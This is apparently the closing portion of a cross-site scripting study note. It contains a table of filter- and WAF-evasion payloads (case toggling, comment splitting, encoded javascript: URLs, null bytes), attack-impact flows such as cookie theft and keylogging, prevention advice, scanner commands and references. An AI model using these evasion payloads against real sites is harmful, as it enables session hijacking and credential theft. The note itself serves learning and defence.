| **Case Toggling** | `<ScrIpT>confirm()</sCRiPt>` | Change case to bypass filters |
| **Using Comments** | `<!--><script>confirm/**/0/**/</script>` | Disrupt parser logic |
| **Null Character Injection** | `%00` | Break WAF parsing |
| **Inline Comments** | `/*!SELECT*/` | Break keyword detection |
| **HTTP Parameter Pollution** | `?id=1&id=2` | Confuse parameter parsers |
| **Keyword Splitting** | `SEL<ECT>` | Split malicious keyword |
| **Character Reference Encoding** | `<a href=j&#97;v&#97;script&#x3A;&#97;lert(1)>` | Use ASCII/hex refs |
| **Junk Characters** | `<script>+-+1-++alert(1)</script>` | Add noise to mask intent |
| **WAF Auto-learning Abuse** | `N/A` | Exploit adaptive behavior |

### **FLOW After encoding , obfuscation :**

Attacker Payload → Encoded/Obfuscated → Frontend Validation → (Mostly bypassed) →WAF Filtering → (Can be bypassed) → Backend Canonicalization → Decoding → Validation → Output Encoding → Browser Rendering

- If canonicalization + output encoding are **correct** → **XSS blocked**
- If output encoding is **missing** → **XSS executes**

---

## Impacts of XSS

### **1. Session Hijacking**

Attacker injects JS ➝ steals `document.cookie` (session ID) ➝ sends to attacker server ➝ attacker replays session token ➝ full account takeover.

### **2. Credential Theft**

Malicious XSS form ➝ user enters username/password ➝ JS intercepts form fields ➝ exfiltrates to attacker ➝ attacker logs in as victim.

### **3. Keylogging**

Injected JS hooks `onkeypress` ➝ captures keystrokes ➝ sends keystrokes to attacker ➝ attacker reconstructs passwords/inputs.

### **4. Phishing Through DOM Injection**

XSS injects fake login popup/UI ➝ user believes it’s legitimate ➝ enters credentials ➝ attacker captures them ➝ impersonation.

### **5. Malware Distribution**

XSS injects `<script src="malware.js">` ➝ browser loads malicious script ➝ installs trojan/stealer ➝ attacker gains persistence.

### **6. Account Takeover / Privilege Abuse**

XSS runs privileged actions via victim session ➝ performs admin actions (add users, change roles) ➝ escalates privileges invisibly.

### **7. CSRF Automation via XSS**

XSS bypasses CSRF tokens ➝ attacker uses victim session + JS to send authenticated requests ➝ performs destructive actions.

### **8. Internal Network Scanning**

XSS executes JS in victim browser ➝ sends requests to internal IPs (`192.168.*.*`) ➝ maps internal services ➝ attacker pivots internally.

### **9. Stored Worm / Self-Propagating XSS**

XSS writes payload into DB ➝ every viewer gets infected ➝ their browsers inject the same payload ➝ worm spreads across users rapidly.

### **10. Browser Exploitation**

XSS loads malicious iframes ➝ exploits browser/plugin vulnerabilities ➝ code execution ➝ full host compromise (rare but real).

### **11. Data Exfiltration**

XSS reads form fields, CSRF tokens, page data ➝ exfiltrates via `fetch()`/`img` beacon ➝ attacker obtains sensitive information.

### **12. UI Redressing / Clickjacking Assistance**

XSS manipulates DOM ➝ hides buttons, injects invisible overlays ➝ forces user clicks ➝ triggers unauthorized actions.

### **13. Stored Defacement**

Attacker injects HTML/CSS/JS ➝ alters site appearance ➝ reputational damage ➝ loss of user trust.

### **14. Supply-Chain Attack via XSS**

Malicious script injects compromised CDN/library URLs ➝ every visitor loads attacker-controlled JS ➝ mass compromise.

### **15. Email / Notification Hijacking**

XSS changes notification templates ➝ injects phishing links ➝ attacker spreads malware automatically through system notifications.

- Session Hijacking
- Credential Theft
- Keylogging
- Phishing
- Malware Distribution
- Site Defacement

---

## Prevention Techniques

### Input Validation

- Strict allowlist for all user inputs

### Output Encoding

- Use HTML, JavaScript, URL, and CSS context encoding

### Content Security Policy (CSP)

```
Content-Security-Policy: default-src 'self'; script-src 'self' <https://trusted.cdn.com>
```

### Secure Cookies

- Set `HttpOnly` and `Secure` flags

### Safe DOM Handling

- Prefer `textContent` over `innerHTML`

---

## Tools

- [XSSStrike](https://github.com/s0md3v/XSStrike) → Advanced XSS scanner that analyzes response context to craft **smart, custom payloads** rather than blindly injecting thousands of generic ones.
python3 xssstrike.py -u target_url
- [Dalfox](https://github.com/hahwul/dalfox) → Fast Go-based scanner built for **automation and CI/CD pipelines** that excels at quickly processing lists of URLs from other tools.
**dalfox url target_url**
- [XSpear](https://github.com/hahwul/XSpear) → Ruby-based scanner that combines XSS detection with **static analysis** of security headers, server info, and SQL error patterns.
**Installation:**
- [ezXSS](https://github.com/ssl/ezXSS) → Modern self-hosted blind XSS platform with a dashboard that automatically captures page details, cookies, and screenshots with instant alerts via Slack/Discord.
- [bXSS](https://github.com/LewisArdern/bXSS) → Tool focused on detecting **blind XSS vulnerabilities** by injecting callback payloads that notify you when executed (repository currently inaccessible)

## References

[https://medium.com/@yadav-ajay/cross-site-scripting-xss-eb66824493ae](https://medium.com/@yadav-ajay/cross-site-scripting-xss-eb66824493ae)

[https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)

[https://book.hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/index.html](https://book.hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/index.html)

[https://portswigger.net/research/stealing-httponly-cookies-with-the-cookie-sandwich-technique](https://portswigger.net/research/stealing-httponly-cookies-with-the-cookie-sandwich-technique)

[https://medium.com/@zerodayfreak/exploiting-web-applications-with-cross-site-scripting-xss-a-practical-guide-941137258b80](https://medium.com/@zerodayfreak/exploiting-web-applications-with-cross-site-scripting-xss-a-practical-guide-941137258b80)

[https://medium.com/@bug_vs_me/all-about-xss-cross-site-scripting-1bf764a39159](https://medium.com/@bug_vs_me/all-about-xss-cross-site-scripting-1bf764a39159)

[https://owasp.org/www-community/attacks/xss/](https://owasp.org/www-community/attacks/xss/)

[https://medium.com/@Steiner254/reflected-cross-site-scripting-xss-7aae0f4343c3](https://medium.com/@Steiner254/reflected-cross-site-scripting-xss-7aae0f4343c3)

[https://portswigger.net/web-security/cross-site-scripting](https://portswigger.net/web-security/cross-site-scripting)

[https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html)

[https://www.acunetix.com/blog/articles/xss-filter-evasion-bypass-techniques/](https://www.acunetix.com/blog/articles/xss-filter-evasion-bypass-techniques/)

[https://www.volkis.com.au/blog/bypass-xss-in-wafs/](https://www.volkis.com.au/blog/bypass-xss-in-wafs/)

[https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf)

[https://rootast.medium.com/cross-site-scripting-xss-techniques-bypasses-and-detection-927af5a55d02](https://rootast.medium.com/cross-site-scripting-xss-techniques-bypasses-and-detection-927af5a55d02)

[https://www.intigriti.com/researchers/blog/hacking-tools/hunting-for-blind-cross-site-scripting-xss-vulnerabilities-a-complete-guide](https://www.intigriti.com/researchers/blog/hacking-tools/hunting-for-blind-cross-site-scripting-xss-vulnerabilities-a-complete-guide)

[https://payatu.com/blog/dom-based-xss/](https://payatu.com/blog/dom-based-xss/)